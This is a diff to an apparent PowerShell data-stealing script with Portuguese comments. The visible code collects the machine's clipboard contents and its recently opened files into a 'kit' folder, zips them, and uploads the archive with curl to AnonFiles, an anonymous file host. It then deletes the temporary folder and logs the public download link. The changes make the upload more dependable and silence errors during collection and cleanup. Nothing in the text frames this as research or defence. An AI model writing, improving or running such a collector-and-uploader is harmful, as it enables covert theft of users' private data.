@@ -60,7 +60,7 @@ Get-Clipboard | Out-File "$kit\clipboard.txt" -Encoding UTF8
 
 # 7) Recentes
 Write-Log "[INFO] Listando arquivos recentes..."
-Get-ChildItem "$env:APPDATA\Microsoft\Windows\Recent" |
+Get-ChildItem "$env:APPDATA\Microsoft\Windows\Recent" -EA SilentlyContinue |
     Select Name,LastWriteTime |
     Out-File "$kit\recent.txt" -Encoding UTF8
 
@@ -87,8 +87,8 @@ Write-Log "[ZIP] Criado: $zip ($(Get-Item $zip).Length bytes)"
 Write-Log "[UP] Enviando para AnonFiles..."
 Write-Log "[UP] URL usada: $upUrl"
 try {
-    # --form com @file e type explícito; aspas duplas escapadas pro cmd
-    $reply = cmd /c "curl.exe -s -X POST -H `\"Content-Type: multipart/form-data`\" -F `\"file=@$zip;type=application/zip`\" $upUrl"
+    $curl = (Get-Command curl.exe -ErrorAction Stop).Source
+    $reply = & $curl -s -X POST -H 'Content-Type: multipart/form-data' -F "file=@$zip;type=application/zip" $upUrl
     Write-Log "[UP] Resposta bruta: $reply"
     if ($reply -match '"full":"([^"]+)"') {
         Write-Log "[OK] Upload finalizado – link: $($matches[1])"
@@ -101,5 +101,5 @@ try {
 
 # 11) Limpeza
 Write-Log "[CLEAN] Removendo pasta temporária..."
-Remove-Item $kit -Recurse -Force
+Remove-Item $kit -Recurse -Force -ErrorAction SilentlyContinue
 Write-Log "[END] KIT finalizado. Log completo em $logFile"
